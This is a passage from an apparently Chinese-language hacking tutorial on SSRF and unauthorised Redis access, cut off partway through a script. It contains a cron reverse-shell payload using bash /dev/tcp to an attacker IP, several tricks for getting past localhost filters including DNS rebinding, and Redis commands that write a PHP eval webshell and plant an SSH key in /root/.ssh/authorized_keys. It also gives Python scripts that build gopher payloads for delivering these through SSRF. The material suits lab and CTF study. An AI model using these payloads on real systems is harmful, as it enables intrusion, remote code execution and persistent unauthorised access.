<span class=\"token operator\">*</span> bash <span class=\"token operator\">-</span>i <span class=\"token operator\">></span><span class=\"token operator\">&amp;</span> <span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>tcp<span class=\"token operator\">/</span><span class=\"token number\">192.168</span><span class=\"token number\">.230</span><span class=\"token number\">.132</span><span class=\"token operator\">/</span><span class=\"token number\">1234</span> <span class=\"token number\">0</span><span class=\"token operator\">></span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span>\n\n<span class=\"token operator\">*</span><span class=\"token number\">4</span>\n<span class=\"token variable\">$6</span>\n<span class=\"token class-name type-declaration\">config</span>\n<span class=\"token variable\">$3</span>\n<span class=\"token class-name type-declaration\">set</span>\n<span class=\"token variable\">$3</span>\n<span class=\"token class-name type-declaration\">dir</span>\n<span class=\"token variable\">$16</span>\n<span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>spool<span class=\"token operator\">/</span>cron<span class=\"token operator\">/</span>\n<span class=\"token operator\">*</span><span class=\"token number\">4</span>\n<span class=\"token variable\">$6</span>\n<span class=\"token class-name type-declaration\">config</span>\n<span class=\"token variable\">$3</span>\n<span class=\"token class-name type-declaration\">set</span>\n<span class=\"token variable\">$10</span>\n<span class=\"token class-name type-declaration\">dbfilename</span>\n<span class=\"token variable\">$4</span>\nroot\n<span class=\"token operator\">*</span><span class=\"token number\">1</span>\n<span class=\"token variable\">$4</span>\nsave\nquit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其中</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">*</span>n代表着一条命令的开始，n 表示该条命令由 n 个字符串组成\n<span class=\"token variable\">$n</span>代表着该字符串有 n 个字符<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>执行成功后服务器会返回 +OK，这个是 redis 服务器对 redis 客户端的响应<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150125.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"常见绕过姿势\"><a href=\"#常见绕过姿势\" class=\"headerlink\" title=\"常见绕过姿势\"></a>常见绕过姿势</h1><h2 id=\"URL-and-IP-PASS\"><a href=\"#URL-and-IP-PASS\" class=\"headerlink\" title=\"URL and IP PASS\"></a>URL and IP PASS</h2><p>当遇见过滤<code>localhost</code>和<code>127.0.0.1</code>时，此时是无法直接进行访问内网的，那我们此时该怎么办呢，有以下几种绕过方式</p>\n<h3 id=\"302跳转\"><a href=\"#302跳转\" class=\"headerlink\" title=\"302跳转\"></a>302跳转</h3><p>网络上存在一个名为<code>sudo.cc</code>的服务，放访问这个服务时，会自动重定向到<code>127.0.0.1</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150139.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"添加-绕过\"><a href=\"#添加-绕过\" class=\"headerlink\" title=\"添加@绕过\"></a>添加@绕过</h3><p>平常我们传入的url是<code>url=http://127.0.0.1</code>，如果<br>我们传入的url是<code>url=http://quan9i@127.0.0.1</code>,它此时依旧会访问127.0.0.1</p>\n<p>示例如下<br>题目给出提示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150164.png\" alt=\"在这里插入图片描述\"><br>要求必须以<code>http://notfound.ctfhub.com</code>开头，但我们访问内网文件的话，有这个，该怎么访问呢，这个时候就用到了<code>@</code>字符，我们构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">=</span>http<span class=\"token punctuation\">:</span><span class=\"token comment\">//notfound.ctfhub.com@127.0.0.1/flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150176.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"特殊数字（例如②）\"><a href=\"#特殊数字（例如②）\" class=\"headerlink\" title=\"特殊数字（例如②）\"></a>特殊数字（例如②）</h3><p>有时候可以用特殊数字来绕过，构造特殊的127.0.0.1，如<code>1②7.0.0.1</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150515.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"句号替代-绕过\"><a href=\"#句号替代-绕过\" class=\"headerlink\" title=\"句号替代.绕过\"></a>句号替代.绕过</h3><p>用<code>。</code>来代替<code>.</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150560.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"省略0\"><a href=\"#省略0\" class=\"headerlink\" title=\"省略0\"></a>省略0</h3><p>当过滤<code>127.0.0.1</code>整体时，还有一种绕过方式就是省略中间的0，这个时候也是可以访问的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150574.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"进制转换\"><a href=\"#进制转换\" class=\"headerlink\" title=\"进制转换\"></a>进制转换</h3><p>将<code>127.0.0.1</code>进行转换，转换为其他进制的数从而绕过检测<br>进制转换结果如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">0177.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token comment\">//八进制</span>\n<span class=\"token number\">0x7f</span><span class=\"token number\">.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token comment\">//十六进制</span>\n<span class=\"token number\">2130706433</span> <span class=\"token comment\">//十进制</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>也可以利用php转换脚本来直接得到结果，脚本如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$r</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$r</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4294967296</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"十进制:\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$r</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"八进制:\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">decoct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"十六进制:\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$r</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"特殊0\"><a href=\"#特殊0\" class=\"headerlink\" title=\"特殊0\"></a>特殊0</h3><p>在windows中，0代表<code>0.0.0.0</code>，而在linux下，0代表<code>127.0.0.1</code>，如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">url<span class=\"token operator\">=</span>http<span class=\"token punctuation\">:</span><span class=\"token comment\">//0/flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150588.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"DNS重绑定\"><a href=\"#DNS重绑定\" class=\"headerlink\" title=\"DNS重绑定\"></a>DNS重绑定</h3><p>DNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。</p>\n<p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS 重绑定攻击。<br>攻击过程如下</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。\n\n但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。\n\n要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为<span class=\"token number\">0</span>，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：\n\n服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP\n\n对于获得的IP进行判断，发现为非黑名单IP，则通过验证\n\n服务器端对于URL进行访问，由于DNS服务器设置的TTL为<span class=\"token number\">0</span>，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>DNS重绑定这里简单的说就是我们先提供一个ip，然后在服务端进行解析的过程中再传127.0.0.1，此时就可能会出现访问到本地文件的情况<br>举个栗子，我们设置一个为127.0.0.1，另一个随便写一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150612.png\" alt=\"在这里插入图片描述\"><br>ping这个地址，可以发现有两种情况，一种是<code>1.1.1.14</code>，另一种是<code>127.0.0.1</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150644.png\" alt=\"在这里插入图片描述\"></p>\n<p>DNS重绑定用的是这个网站<a href=\"%5Bhttps://lock.cmpxchg8b.com/rebinder.html%5D\">[https://lock.cmpxchg8b.com/rebinder.html]</a></p>\n<h2 id=\"Redis常见攻击姿势\"><a href=\"#Redis常见攻击姿势\" class=\"headerlink\" title=\"Redis常见攻击姿势\"></a>Redis常见攻击姿势</h2><h3 id=\"绝对路径写webshell\"><a href=\"#绝对路径写webshell\" class=\"headerlink\" title=\"绝对路径写webshell\"></a>绝对路径写webshell</h3><p>前提</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、redis 有 root\n<span class=\"token number\">2</span>、知道网站绝对路径<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>靶机开启redis<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150992.png\" alt=\"在这里插入图片描述\"><br>攻击机连接未授权的redis（博主只是小白，可能有部分有问题）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">redis<span class=\"token operator\">-</span>cli <span class=\"token operator\">-</span>h ip地址<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150976.png\" alt=\"在这里插入图片描述\"><br>连接成功，开始写webshell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">1、flushall //命令用于清空整个 Redis 服务器的数据\n2、set 1 '<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>' //设置内容为一句话木马\n3、config set dir '/var/www/html'  //设置文件存储路径\n4、config set dbfilename shell.php //设置文件名\n5、save //保存<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150028.png\" alt=\"在这里插入图片描述\"><br>去靶机查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150049.png\" alt=\"在这里插入图片描述\"><br>成功写入</p>\n<h4 id=\"结合SSRF\"><a href=\"#结合SSRF\" class=\"headerlink\" title=\"结合SSRF\"></a>结合SSRF</h4><p>此时是后端服务器向 redis 服务器发起请求，因此发送的内容需要转换成 RESP 协议的格式，通过结合 gopher 协议达到写入 shell 的目的</p>\n<p>通用脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> urllib\nprotocol<span class=\"token operator\">=</span><span class=\"token string\">\"gopher://\"</span>\nip<span class=\"token operator\">=</span><span class=\"token string\">\"192.168.134.132\"</span> <span class=\"token operator\">//</span>ip地址\nport<span class=\"token operator\">=</span><span class=\"token string\">\"6379\"</span> <span class=\"token operator\">//</span>端口\nshell<span class=\"token operator\">=</span><span class=\"token string\">\"\\n\\n&lt;?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"</span><span class=\"token operator\">//</span>写入内容为一句话木马\nfilename<span class=\"token operator\">=</span><span class=\"token string\">\"1.php\"</span> <span class=\"token operator\">//</span>文件名为<span class=\"token number\">1</span><span class=\"token punctuation\">.</span>php\npath<span class=\"token operator\">=</span><span class=\"token string\">\"/var/www/html\"</span><span class=\"token operator\">//</span>默认路径\npasswd<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\ncmd<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"flushall\"</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"set 1 &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"config set dir &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"config set dbfilename &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"save\"</span>\n     <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">if</span> passwd<span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"AUTH &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span>protocol<span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\":\"</span><span class=\"token operator\">+</span>port<span class=\"token operator\">+</span><span class=\"token string\">\"/_\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">redis_format</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    CRLF<span class=\"token operator\">=</span><span class=\"token string\">\"\\r\\n\"</span>\n    redis_arr <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n    cmd<span class=\"token operator\">+=</span><span class=\"token string\">\"*\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>redis_arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> redis_arr<span class=\"token punctuation\">:</span>\n        cmd<span class=\"token operator\">+=</span>CRLF<span class=\"token operator\">+</span><span class=\"token string\">\"$\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>CRLF<span class=\"token operator\">+</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">+=</span>CRLF\n    <span class=\"token keyword\">return</span> cmd\n\n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> cmd<span class=\"token punctuation\">:</span>\n        payload <span class=\"token operator\">+=</span> urllib<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>redis_format<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> payload<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150086.png\" alt=\"在这里插入图片描述\"><br>尝试使用此payload进行攻击<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150112.png\" alt=\"在这里插入图片描述\"><br>查看该目录下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150480.png\" alt=\"在这里插入图片描述\"><br>成功写入</p>\n<h3 id=\"写ssh公钥\"><a href=\"#写ssh公钥\" class=\"headerlink\" title=\"写ssh公钥\"></a>写ssh公钥</h3><p>条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、Redis服务使用<span class=\"token constant\">ROOT</span>账号启动\n<span class=\"token number\">2</span>、服务器开放了<span class=\"token constant\">SSH</span>服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>在靶机中执行命令<code>ssh-keygen -t rsa</code>，而后一路回车即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150535.png\" alt=\"在这里插入图片描述\"><br>此时去找公钥和私钥存放位置</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">find <span class=\"token operator\">.</span> <span class=\"token operator\">-</span>name <span class=\"token string double-quoted-string\">\".ssh\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150528.png\" alt=\"在这里插入图片描述\"><br>查看id_rsa.pub内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">ssh<span class=\"token operator\">-</span>rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTcPHlQF54WarRY8IQY7<span class=\"token operator\">+</span>mKkkQm7hWDSn5rHreuLNtd56bJdY<span class=\"token operator\">/</span>melINxXeQ2c<span class=\"token operator\">/</span>xiupBWKoKZSz8RwPx<span class=\"token operator\">+</span>yz36Zvvpfa<span class=\"token operator\">/</span>DXUN9MA6CJz4zofjmFbQWImSe3pEFJ2V3XbPPSEOz38bXKRK<span class=\"token operator\">/</span>akLYL9CI2joGh4mv4iQgSxHF40HKrVyl4<span class=\"token operator\">/</span><span class=\"token constant\">UD40S</span><span class=\"token operator\">/</span>ujVtaj1AJUcpTQkm9MW9VuQY110WW0HI1LRXyiAlF9EbLxe7WQY78eASI86gI8gil6UHE0Y6v41JxQJHkf63q6fzcIYBrmfePn8K8PzDIViu<span class=\"token operator\">+</span>Pf<span class=\"token operator\">+</span>Tx9dP<span class=\"token operator\">+</span>YodAZo6ZDbsg06aJG1cYHbnG<span class=\"token operator\">+</span>qWSoeybDcnxhRj2c5PS9zzjWHNE1eWyP9ILs4P4ZDfy8ZX4i9twWdF8FLhpDpogfcKJJ2f1G4tHKdnrbSGVtZw<span class=\"token operator\">+</span>QoIVmbGtW8feEKgAW71PEK2wBVacrqfpd7AxslCL8RCqETa8iVnR5shNs4cAHxLhIdmF8mmk5ZBE2On<span class=\"token operator\">/</span>uoWf3x<span class=\"token operator\">+</span>FSzicmhV6d8zDFkE<span class=\"token operator\">=</span> root@kali<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时去攻击机上连接redis</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">flushall\nset <span class=\"token number\">1</span> <span class=\"token string single-quoted-string\">'id_rsa.pub内容'</span>\nconfig set dir <span class=\"token string single-quoted-string\">'/root/.ssh/'</span>\nconfig set dbfilename authorized_keys\nsave<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150557.png\" alt=\"在这里插入图片描述\"><br>去靶机里查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150603.png\" alt=\"在这里插入图片描述\"><br>成功写入<br>此时<code>ssh -root@靶机ip</code>即可成功登录</p>\n<h4 id=\"结合SSRF-1\"><a href=\"#结合SSRF-1\" class=\"headerlink\" title=\"结合SSRF\"></a>结合SSRF</h4><p>脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> urllib\nprotocol<span class=\"token operator\">=</span><span class=\"token string\">\"gopher://\"</span>\nip<span class=\"token operator\">=</span><span class=\"token string\">\"192.168.134.132\"</span>\nport<span class=\"token operator\">=</span><span class=\"token string\">\"6379\"</span>\nfilename<span class=\"token operator\">=</span><span class=\"token string\">\"authorized_keys\"</span>\nssh_pub<span class=\"token operator\">=</span><span class=\"token string\">\"\\n\\nssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABgQDTcPHlQF54WarRY8IQY7+mKkkQm7hWDSn5rHreuLNtd56bJdY/melINxXeQ2c/xiupBWKoKZSz8RwPx+yz36Zvvpfa/DXUN9MA6CJz4zofjmFbQWImSe3pEFJ2V3XbPPSEOz38bXKRK/akLYL9CI2joGh4mv4iQgSxHF40HKrVyl4/UD40S/ujVtaj1AJUcpTQkm9MW9VuQY110WW0HI1LRXyiAlF9EbLxe7WQY78eASI86gI8gil6UHE0Y6v41JxQJHkf63q6fzcIYBrmfePn8K8PzDIViu+Pf+Tx9dP+YodAZo6ZDbsg06aJG1cYHbnG+qWSoeybDcnxhRj2c5PS9zzjWHNE1eWyP9ILs4P4ZDfy8ZX4i9twWdF8FLhpDpogfcKJJ2f1G4tHKdnrbSGVtZw+QoIVmbGtW8feEKgAW71PEK2wBVacrqfpd7AxslCL8RCqETa8iVnR5shNs4cAHxLhIdmF8mmk5ZBE2On/uoWf3x+FSzicmhV6d8zDFkE= root@kali \\n\\n\"</span>\npath<span class=\"token operator\">=</span><span class=\"token string\">\"/root/.ssh/\"</span>\npasswd<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\ncmd<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"flushall\"</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"set 1 &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>ssh_pub<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"$&#123;IFS&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"config set dir &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"config set dbfilename &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n     <span class=\"token string\">\"save\"</span>\n     <span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">if</span> passwd<span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"AUTH &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload<span class=\"token operator\">=</span>protocol<span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\":\"</span><span class=\"token operator\">+</span>port<span class=\"token operator\">+</span><span class=\"token string\">\"/_\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">redis_format</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    CRLF<span class=\"token operator\">=</span><span class=\"token string\">\"\\r\\n\"</span>\n    redis_arr <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    cmd<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n    cmd<span class=\"token operator\">+=</span><span class=\"token string\">\"*\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>redis_arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> redis_arr<span class=\"token punctuation\">:</span>\n        cmd<span class=\"token operator\">+=</span>CRLF<span class=\"token operator\">+</span><span class=\"token string\">\"$\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span 